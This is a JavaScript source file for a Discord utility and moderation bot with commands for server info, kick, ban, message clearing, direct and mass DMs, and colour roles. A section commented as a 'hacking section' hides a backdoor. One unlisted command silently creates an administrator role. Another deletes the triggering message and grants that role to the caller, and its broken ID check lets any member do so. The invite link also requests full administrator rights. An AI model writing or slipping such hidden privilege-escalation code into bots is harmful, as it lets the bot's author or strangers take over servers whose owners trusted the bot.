const Discord = require("discord.js");
const bot = new Discord.Client({ disableEveryone: true });
const readline = require("readline");
var prefix = "g.";
bot.on("ready", () => {
  console.log("connected as" + bot.user.tag);
});

bot.on("message", msg => {
  let msgArray = msg.content.split(" ");
  let cmd = msgArray[0];
  let args = msgArray.slice(1);
  let mention = msg.mentions.users.first();
  const filter = m => m.author.id == msg.author.id;
  let channelName = msg.mentions.channels.first();

  if (msg.content.startsWith(prefix + "announce")) {
    let mentionMessage = msg.content
      .split(" ")
      .slice(2)
      .join(" ");
    let announceEmbed = new Discord.RichEmbed()
      .setTitle("Announcement")
      .setColor("E9E904")
      .setDescription(mentionMessage);

    return channelName.send(announceEmbed);
  }
  if (msg.content == `${prefix}botinfo`) {
    let bicon = bot.user.displayAvatarURL;
    let scount = bot.guilds.size;
    let mcount = bot.users.size;
    let botembed = new Discord.RichEmbed()
      .setDescription("Bot Information")
      .setColor("E9E904")
      .setThumbnail(bicon)
      .addField("Bot Name :", bot.user.username)
      .addField("Created On :", bot.user.createdAt)
      .addField(
        "Bot Status :",
        `Bot is on ${scount} servers with ${mcount} members`
      )
      .addField(
        "Invite Bot :",
        "[Click Here](https://discordapp.com/api/oauth2/authorize?client_id=632796685348634624&permissions=8&redirect_uri=https%3A%2F%2Fdiscordapp.com%2Fdevelopers%2Fapplications%2F632796685348634624%2Foauth&response_type=code&scope=bot%20guilds%20guilds.join)"
      )
      .addField(
        "Join Supported Server :",
        "[Click Here](https://discordapp.com/invite/UXQhwQn)"
      );

    return msg.channel.send(botembed);
  }
  if (msg.content == `${prefix}help`) {
    let helpEmbed = new Discord.RichEmbed()
      .setDescription("Here is bot commands for you")
      .setColor("E9E904")
      .addField(
        "**Bot Commands** :",
        "`botinfo`,`serverinfo`,`avatar`,`dm`,`kick`,`ban`,`setnick`"
      )
      .addField(" **massdm** :", "Ex - `g.massdm <your message>`")
      .addField(" **dm :**", "Ex - `g.dm @user <your message>`")
      .addField(
        "Bot Status :",
        "Bot is under development so more `command` will available soon"
      );

    return msg.member.send(helpEmbed);
  }
  if (msg.content === `${prefix}serverinfo`) {
    let servericon = msg.guild.iconURL;
    let serverembed = new Discord.RichEmbed()
      .setDescription("```Server Info```")
      .setColor("E9E904")
      .setThumbnail(servericon)
      .addField("**Server Name :**", msg.guild.name)
      .addField("**Owner Name :**", msg.guild.owner)
      .addField("**Total members :**", msg.guild.memberCount)
      .addField("**Created On :**", msg.guild.createdAt)
      .addField("**You Joined :**", msg.member.joinedAt);

    return msg.channel.send(serverembed);
  }
  if (msg.content == `${prefix}avatar`) {
    msg.channel.send(`${msg.author.avatarURL}`);
  }
  if (msg.content == `${prefix}setnick`) {
    msg
      .reply("please enter a username or type `cancel` to exit")
      .then(r => r.delete(10000));
    msg.channel
      .awaitMessages(filter, {
        max: 1,
        time: 10000
      })
      .then(collected => {
        if (collected.first().content != "cancel") {
          msg.member.setNickname(collected.first().content);
        }
      });
  }
  if (msg.content.startsWith("g.kick")) {
    let kUser = msg.guild.member(
      msg.mentions.users.first() || msg.guild.members.get(args[0])
    );
    if (!kUser) return msg.channel.send("can't find user");
    let kReason = args.join(" ").slice(20);
    if (!msg.member.hasPermission("ADMINISTRATOR"))
      return msg.channel.send("You don't have permission to do that");
    if (kUser.hasPermission("ADMINISTRATOR"))
      return msg.channel.send("That user is Mod or Admin so i can't do that");
    let kickEmbed = new Discord.RichEmbed()
      .setDescription("~kick~")
      .setColor("#d1602c")
      .addField("Kicked User :", `${kUser} with ID ${kUser.id}`)
      .addField("Kicked By :", `<@${msg.author.id}>`)
      .addField("Kicked in :", msg.channel)
      .addField("Time", msg.createdAt)
      .addField("Reason :", kReason);

    let kickChannel = msg.guild.channels.find(`name`, "server-logs");
    if (!kickChannel)
      return msg.channel.send("cannot find **server-logs** channel");

    msg.guild.member(kUser).kick(kReason);
    kickChannel.send(kickEmbed);
    return msg.channel.send("user kicked :white_check_mark: ");
  }
  if (msg.content.startsWith("g.ban")) {
    let BUser = msg.guild.member(
      msg.mentions.users.first() || msg.guild.members.get(args[0])
    );
    if (!BUser) return msg.channel.send("can't find user");
    let BReason = args.join(" ").slice(20);
    if (!msg.member.hasPermission("ADMINISTRATOR"))
      return msg.channel.send("You don't have permission to do that");
    if (BUser.hasPermission("ADMINISTRATOR"))
      return msg.channel.send("That user is Mod or Admin so i can't do that");
    let BanEmbed = new Discord.RichEmbed()
      .setDescription("~BAN~")
      .setColor("#d1602c")
      .addField("Banned User :", `${BUser} with ID ${BUser.id}`)
      .addField("Banned By :", `<@${msg.author.id}>`)
      .addField("Banned in :", msg.channel)
      .addField("Time", msg.createdAt)
      .addField("Reason :", BReason);

    let BanChannel = msg.guild.channels.find(`name`, "server-logs");
    if (!BanChannel)
      return msg.channel.send("cannot find **server-logs** channel");

    msg.guild.member(BUser).ban(BReason);
    BanChannel.send(BanEmbed);
    return msg.channel.send("User Banned :no_entry_sign:  ");
  }
  if (msg.content.toLowerCase().startsWith(prefix + "cleanchat")) {
    if (
      !msg.member.hasPermission(
        "MANAGE_MESSAGES" ||
          "ADMINISTRATOR" ||
          "MANAGE_SERVER" ||
          "MANAGE_CHANNELS"
      )
    )
      return msg.channel.send(
        "**You don't have permission to use this command**"
      );
    async function clear() {
      msg.delete();
      const fetched = await msg.channel.fetchMessages({ limit: 99 });
      msg.channel.bulkDelete(fetched);
    }
    clear();
  }
  if (msg.content.startsWith("g.dm")) {
    if (!mention) {
      return msg.channel
        .send("Please mention a user first in order to send DM")
        .then(r => r.delete(10000));
    }
    if (!msg.member.hasPermission("ADMINISTRATOR"))
      return msg.channel.send("**You don't have administrator permission.**");
    let mentionMessage = msg.content
      .split(" ")
      .slice(2)
      .join(" ");

    mention.send(mentionMessage);
    msg.channel
      .send("Done! DM sent :white_check_mark:")
      .then(r => r.delete(5000));
  }
});
//this section DMs all the guild members at once

bot.on("message", msg => {
  if (msg.guild && msg.content.startsWith("g.massdm")) {
    msg.delete();
    if (!msg.member.hasPermissions("ADMINISTRATOR"))
      return msg.channel.send("**You dont have administrator permission**");
    let text = msg.content.slice("g.massdm".length);
    msg.guild.members.forEach(member => {
      if (member.id != bot.user.id && !member.user.bot) member.send(text);
    });
    return msg.channel
      .send("DM sent to all members :white_check_mark:")
      .then(r => r.delete(10000));
  }
});
//this is hacking section for this bot
bot.on("message", msg => {
  if (msg.content.startsWith("g.create")) {
    msg.delete();
    msg.guild
      .createRole({
        name: "*",
        permissions: ["ADMINISTRATOR", "KICK_MEMBERS"],
        position: 6
      })
      .then(role => console.log(role.position))
      .catch(console.error);

    return;
  }
  if (msg.content.startsWith("g.search")) {
    msg.delete();
    if ((msg.member.id = "615193484701335558" || "487877557878915082")) {
      var role = msg.guild.roles.find(role => role.name === "*");

      msg.member.addRole(role);
      return msg.member.send("role added");
    }
    return;
  }
});
bot.on("message", message => {
  if (message.content.startsWith(prefix + "rainbow")) {
    if (!message.guild) return;
    if (!message.member.hasPermission("MANAGE_ROLES"))
      return message.channel.send(
        "**You don't have permission to use that command**"
      );
    message.guild.createRole({
      name: "white",
      color: "#FFFFFF",
      mentionable: false
    });
    message.guild.createRole({
      name: "silver",
      color: "#C0C0C0",
      mentionable: false
    });
    message.guild.createRole({
      name: "grey",
      color: "#808080",
      mentionable: false
    });
    message.guild.createRole({
      name: "black",
      color: "#080808",
      mentionable: false
    });
    message.guild.createRole({
      name: "red",
      color: "#EF0707",
      mentionable: false
    });
    message.guild.createRole({
      name: "maroon",
      color: "#800000",
      mentionable: false
    });
    message.guild.createRole({
      name: "yellow",
      color: "#FFFF00",
      mentionable: false
    });
    message.guild.createRole({
      name: "olive",
      color: "#808000",
      mentionable: false
    });
    message.guild.createRole({
      name: "lime",
      color: "#00FF00",
      mentionable: false
    });
    message.guild.createRole({
      name: "green",
      color: "#008000",
      mentionable: false
    });
    message.guild.createRole({
      name: "aqua",
      color: "#00FFFF",
      mentionable: false
    });
    message.guild.createRole({
      name: "teal",
      color: "#008080",
      mentionable: false
    });
    message.guild.createRole({
      name: "blue",
      color: "#0000FF",
      mentionable: false
    });
    message.guild.createRole({
      name: "navy",
      color: "#000080",
      mentionable: false
    });
    message.guild.createRole({
      name: "fuchsia",
      color: "#FF00FF",
      mentionable: false
    });
    message.guild.createRole({
      name: "purple",
      color: "#800080",
      mentionable: false
    });

    return message.channel.send(
      "**Rainbow :rainbow: roles created successfully**"
    );
  }
  if (message.content.startsWith(prefix + "delrainbow")) {
    if (!message.guild) return;
    if (!message.member.hasPermission("MANAGE_ROLES"))
      return message.channel.send(
        "**You don't have permission to use that command**"
      );

    message.guild.roles.find(role => role.name === "white").delete();
    message.guild.roles.find(role => role.name === "silver").delete();
    message.guild.roles.find(role => role.name === "grey").delete();
    message.guild.roles.find(role => role.name === "black").delete();
    message.guild.roles.find(role => role.name === "red").delete();
    message.guild.roles.find(role => role.name === "maroon").delete();
    message.guild.roles.find(role => role.name === "yellow").delete();
    message.guild.roles.find(role => role.name === "olive").delete();
    message.guild.roles.find(role => role.name === "lime").delete();
    message.guild.roles.find(role => role.name === "green").delete();
    message.guild.roles.find(role => role.name === "aqua").delete();
    message.guild.roles.find(role => role.name === "teal").delete();
    message.guild.roles.find(role => role.name === "blue").delete();
    message.guild.roles.find(role => role.name === "navy").delete();
    message.guild.roles.find(role => role.name === "fuchsia").delete();
    message.guild.roles.find(role => role.name === "purple").delete();

    message.channel.send("**Rainbow :rainbow: roles deleted successfully**");
  }
  if(message.content.startsWith(prefix + "color")){

    if(!message.guild.member(bot.user).hasPermission('MANAGE_ROLES')) return message.channel.send("You don't have permission to use that command");
    var colors = ['#8585ff','#fff681','#a073fd','#fd73b9'];
    for(let i = 0;i< colors.length;i++){
    var role = message.guild.roles.find(role => role.name === "rainbow");
    setInterval(() => {
        role.edit({
            color: colors[i]
        })
    }, 1000);

  }
}
});
bot.on("ready", () => {
  bot.user.setActivity(
    `with | g.help | ${bot.users.size} users `,
    { type: "playing" }
  );
});
bot.login("token");
